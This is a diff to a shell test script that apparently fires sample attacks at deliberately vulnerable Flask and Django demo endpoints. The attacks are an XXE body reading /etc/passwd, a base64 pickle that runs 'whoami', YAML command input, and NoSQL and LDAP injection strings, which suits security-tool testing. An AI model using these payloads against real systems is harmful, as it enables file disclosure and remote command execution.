@@ -47,11 +47,19 @@ api_get() {
   local QUERY=$2
 
   for FRAMEWORK in "${FRAMEWORKS[@]}"; do
-    echo "=========================== GET /api/${FRAMEWORK}/${API_PATH}"
-    echo
-    curl_with_code  "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}&${QUERY}"
-    echo
+    api_get_single ${FRAMEWORK} ${API_PATH} ${QUERY}
   done
+}
+
+api_get_single() {
+  local FRAMEWORK=$1
+  local API_PATH=$2
+  local QUERY=$3
+
+  echo "=========================== POST /api/${FRAMEWORK}/${API_PATH}"
+  echo
+  curl_with_code "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}&${QUERY}"
+  echo
 }
 
 api_post() {
@@ -100,7 +108,7 @@ api_post "demo/sqlite3_post" "name=song"
 headline "xss"
 api_get "demo/xss_return" "content=alert"
 api_get "demo/xss_template" "content=alert"
-api_post_single flask "demo/xss_template_string" "content=alert"
+api_get_single flask "demo/xss_template_string" "content=alert"
 
 headline "xxe"
 curl_with_code -H "Content-Type: text/plain" "${HOST}/api/django/demo/xxe_login?_r=${RUN_ID}" -X POST --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Anything [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>yzx</password></user>'
@@ -112,7 +120,11 @@ api_get "demo/request_ssrf" "url=https://www.huoxian.cn/"
 
 headline "unsafe-deserialization"
 api_post "demo/yaml_post_e" "code=whoami"
-api_post_single flask "demo/get_pickle_data" "gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4="
+api_post_single flask "demo/get_pickle_data" "code=gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4="
 
 headline "nosql-injection"
-api_post_single flask "demo/mongo_find" "name=' || '' == '"
+api_get_single flask "demo/mongo_find" "name=%27%20||%20%27%27%20==%20%27"
+
+headline "ldap-injection"
+api_get_single flask "demo/ldap_search" "username=*&password=*"
+api_get_single flask "demo/ldap_safe_search" "username=*&password=*"
